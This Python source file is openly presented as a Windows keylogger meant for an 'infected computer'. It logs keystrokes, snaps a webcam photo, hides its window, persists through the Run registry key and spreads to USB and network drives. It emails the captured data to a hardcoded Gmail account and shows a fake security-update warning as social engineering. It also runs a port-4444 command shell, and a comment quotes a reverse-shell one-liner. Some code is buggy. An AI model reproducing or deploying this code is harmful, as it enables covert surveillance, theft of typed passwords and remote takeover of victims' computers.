#pywin32 modules
import win32api
import win32con
import win32gui
import win32file
 
#python modules
import os
import socket
import time
import threading
from smtplib import SMTP
from smtplib import SMTPException
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEImage import MIMEImage
 
 
#Sample data about the infected computer
'''In order to understand some of the info you will recive from the email,you
will require to go to msdn ref mannuals to identify some function data.C/c++ knowledge
maybe required,but nothing python cannot handle.
e.g:
i.)http://msdn.microsoft.com/en-us/library/windows/desktop/ms724958%28v=vs.85%29.aspx
ii.)http://msdn.microsoft.com/en-us/library/windows/desktop/dd318693%28v=vs.85%29.aspx
iii.)http://msdn.microsoft.com/en-us/library/windows/desktop/ms724958%28v=vs.85%29.aspx
'''
 
#I know this could be done easily but what tha heck!
CompName="Computer Name:"+str(win32api.GetComputerName())#Computer Name
CommandLine="Commandline:"+str(win32api.GetCommandLine())#Command line used
DomainName="DomainName:"+str(win32api.GetDomainName())#Domain name
FreeSpace="Free space:"+str(win32api.GetDiskFreeSpace())#Hard disk free space
LocalTime="Local time:"+str(win32api.GetLocalTime())#local time
LogicalDrives="Logical Drives:"+win32api.GetLogicalDriveStrings()#list of drivese.g C:\\,E:\\etc
PowerCapabilities="Power Capabilities:"+str(win32api.GetPwrCapabilities())#System power capabilites
language="Language:"+str(win32api.GetSystemDefaultLangID())#System set language
SystemInfo="System Info:"+str(win32api.GetSystemInfo())#system information
SystemInfo_2="System Info 2:"+str(win32api.GetNativeSystemInfo())#like above but for Wow64 process.
TempPath="Temp folder:"+str(win32api.GetTempPath())#path to temp file
TimeZone="Time Zone:"+str(win32api.GetTimeZoneInformation())#Time zone
WindowsVersion="Windows Version:"+str(win32api.GetVersion())#windows version
 
#Group the infected machine data in a list
listdata=[CompName,CommandLine,DomainName,FreeSpace,LocalTime,LogicalDrives,
          PowerCapabilities,language,SystemInfo,SystemInfo_2,TempPath,TimeZone,
          WindowsVersion]
 
def Mail_gmail(passwd="12345qwert@321",data="Hi Sir this is what i have collected!"):
    """Sends the keypress text file and user snapshot"""
    #email data
    subject="Data from ",CompName
    sender="llynch701@gmail.com"
    receiver="llynch701@gmail.com"
    gmailSMTP="smtp.gmail.com"
    gmailPort=587
    TextSubtype='plain'
   
    #create the email
    msg=MIMEMultipart()
    msg["Subject"]=subject
    msg["From"]=sender
    msg["To"]=receiver
    body=MIMEMultipart('alternative')
    body.attach(MIMEText(data,TextSubtype))
   
    #Attach the message
    msg.attach(body)
    msg.attach(MIMEText(file("Keystroke.txt").read()))
    #attach a pic of the user at start up.
    msg.attach(MIMEImage(file("user.jpg").read()))
    try:
      smtpObj = SMTP(gmailSMTP,gmailPort)
      #Identify yourself to GMAIL ESMTP server.
      smtpObj.ehlo()
      #Put SMTP connection in TLS mode and call ehlo again.
      smtpObj.starttls()
      smtpObj.ehlo()
      #Login to service
      smtpObj.login(user=sender, password=passwd)
      #Send email
      smtpObj.sendmail(sender, receiver, msg.as_string())
      #close connection and session.
      smtpObj.quit()
    except:
        #if error in send mail tell the user to connect to the internet
        #try some social engineering.
        win32api.MessageBox(None,"Please Connect to the internet.Windows requires a urgent security update!","Security update!",win32con.MB_ICONWARNING)
        threading.Timer(300,Mail_gmail)#wait for 5 min assuming the user has connected and send
 
       
#please note that a yahoo is more simpler to send via than google.
#google has too many restrictions.
        #Yahoo implimentation:
       
def Mail_yahoo(passwd="",data="Hi Sir this is what i have collected!"):
    """Sends the keypress text file"""
    #email data
    subject="Data from ",CompName
    sender=""
    receiver=""
    gmailSMTP="smtp.mail.yahoo.com"
    gmailPort=465
    TextSubtype='plain'
 
    #create the email
    msg=MIMEMultipart()
    msg["Subject"]="Key"
    msg["From"]=""
    msg["To"]=""
    body=MIMEMultipart('alternative')
    body.attach(MIMEText(data,TextSubtype))
 
    #Attach the message
    msg.attach(body)
    msg.attach(MIMEText(file("Keystroke.txt").read()))
    #attach a pic of the user at start up.
    #msg.attach(MIMEImage(file("user.jpg").read()))
    try:
        smtpObj = SMTP_SSL(gmailSMTP, gmailPort)
        #Identify yourself to GMAIL ESMTP server.
        #smtpObj.ehlo()
        #Put SMTP connection in TLS mode and call ehlo again.
        #smtpObj.starttls()
        #smtpObj.ehlo()
        #Login to service
        smtpObj.login(user=sender, password=passwd)
        #Send email
        smtpObj.sendmail(sender,receiver, msg.as_string())
        #close connection and session.
        smtpObj.quit()
    except:
        #if error in send mail tell the user to connect to the internet
        #try some social engineering.
        win32api.MessageBox(None,"Please Connect to the internet.Windows requires a urgent security update!","Security update!",win32con.MB_ICONWARNING)
        threading.Timer(300,Mail_yahoo)#wait for 5 min assuming the user has connected and send
       
###############################################################################################
 
   
def SaveKeys(key_stroke=0,key_file="Keystroke.txt"):
    '''Get Keystrokes and write to file'''
    #Also not this are not the only virutal keys there others you can add them.
   
    if key_stroke==1 or key_stroke==2:
        return 0
    fp=open(os.getcwd()+"\\"+key_file,"a+")
    if key_stroke==8:
        fp.write("[Backspace]")
    elif key_stroke==13:
        fp.write("\n")
    elif key_stroke==32:
        fp.write(" ")
    elif key_stroke==win32con.VK_TAB:
        fp.write("[Tab]")
    elif key_stroke==win32con.VK_SHIFT:
        fp.write("[Shift]")
    elif key_stroke==win32con.VK_CONTROL:
        fp.write("[Control]")
    elif key_stroke==win32con.VK_ESCAPE:
        fp.write("[Escape]")
    elif key_stroke==win32con.VK_END:
        fp.write("[End]")
    elif key_stroke==win32con.VK_HOME:
        fp.write("[Home]")
    elif key_stroke==win32con.VK_LEFT:
         fp.write("[Left]")
    elif key_stroke==win32con.VK_UP:
        fp.write("[UP]")
    elif key_stroke==win32con.VK_RIGHT:
        fp.write("[Right]")
    elif key_stroke==win32con.VK_DOWN:
        fp.write("[Down]")
    elif key_stroke==190 or key_stroke==110:
        fp.write(".")
    else:
        fp.write(chr(key_stroke))#chr(int) ord(string)
    fp.close()
 
   
def stealth():
    '''hides the window and allows it to run in the background'''
    stealth=win32gui.FindWindow("ConsoleWindowClass",None)
    win32gui.ShowWindow(stealth,0)
 
   
def UserSnapShot():
    '''take a snapshot of the user'''
    from VideoCapture import Device
    cam=Device()
    cam.saveSnapshot(os.getcwd()+'\\User.jpg')
 
   
def OnStartup(key_file="Keystroke.txt"):
    '''Opens the log file and creates a start up key'''
    count=1
    #Write infected computer information on to the file.
    fp=open(os.getcwd()+"\\"+key_file,"a+")
    for x in listdata:
        fp.writelines(str(count)+".)"+x+"\n")
        fp.writelines("-----------------------------------------------------------\n")
        count=count+1
    #add keylogger to registery!
    hkey=win32api.RegCreateKey(win32con.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    win32api.RegSetValueEx(hkey,'Clone',0,win32con.REG_SZ,(os.getcwd()+"\\keylogger.py"))
    win32api.RegCloseKey(hkey)
 
#cpu issue but do something about the loop....you can increment the drive so that
#it points to the next drive.    
def UsbNetInfect():
    '''The following function infects usb and network drive'''
    drives=win32api.GetLogicalDriveStrings()
    while drives:
        drives=win32api.GetLogicalDriveStrings()#call it again so that if a usb or network drive is avaliable it copys the keylogger.
        for drive in drives.split("\\"):
            if win32file.GetDriveType(drive)==2 || win32file.GetDriveType(drive)==4:
                win32file.CopyFile("C:\\Keylogger.py",str(drive+"\\"),1)#have the correct int for bFailIfExists
               
 
#Okay maybe you could do better...i know metasploit does it well...but what tha heck!
def BackConnect():
    '''Executing remote commands via "backdoor"...never mind!
in linux this is easy...windows i don't know...but
{----python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);')
----}
'''
#use this instead to get the results from the command execution.
#proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,\
#                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
#        out,err=proc.communicate()
 #       ip.send(out+err)
#
   
    command=""
    s=socket.socket()
    port=4444
    host=socket.gethostname()
    s.bind((host,port))
    s.listen(10)
    while True:
        ip,addr=s.accept()
        ip.send("Connected to localhost:")
        while command!="quit":
            ip.send("Enter Command:\t 'quit' to stop")
            command=ip.recv(2222)
            res=os.system(command)
            if res==0 and command!="quit":
                ip.send("Command executed successfuly!")
            elif res==1 and command=="quit":
                ip.send("Disconnecting....Goodbye!")
            else:
                ip.send("Command error!")
        s.close()  
 
#Def InfectFiles():
         #fp=open(os.getcwd()+"\\"+key_file,"a+")
        #search files and infect the....overwrite maybe.
        #remember to have a magic sequence an identify so that it does re-infect.
        #blah! blah!
           
   
 
def main():
    '''start defined functions'''
    stealth()
    OnStartup()
    UserSnapShot()
    UsbNetInfect()
    BackConnect()
   
#key    
i=0
 
#continously,take key strokes add save in file.
main()
while True:
    for i in range(1,191):
        if win32api.GetAsyncKeyState(i)==-32767:
            SaveKeys(i)
            send=threading.Timer(1200,Mail_gmail)#send email of data(keystroke and snapshot) after 30min
            send.start()
 
#Notes:
#Yahoo! Mail from any email program are:
#1.)Yahoo! Mail SMTP server address: smtp.mail.yahoo.com
#2.)Yahoo! Mail SMTP user name: Your full Yahoo! Mail email address (including "@yahoo.com")
#3.)Yahoo! Mail SMTP password: Your Yahoo! Mail password
#4.)Yahoo! Mail SMTP port: 465
#5.)Yahoo! Mail SMTP TLS/SSL required: yes
           
 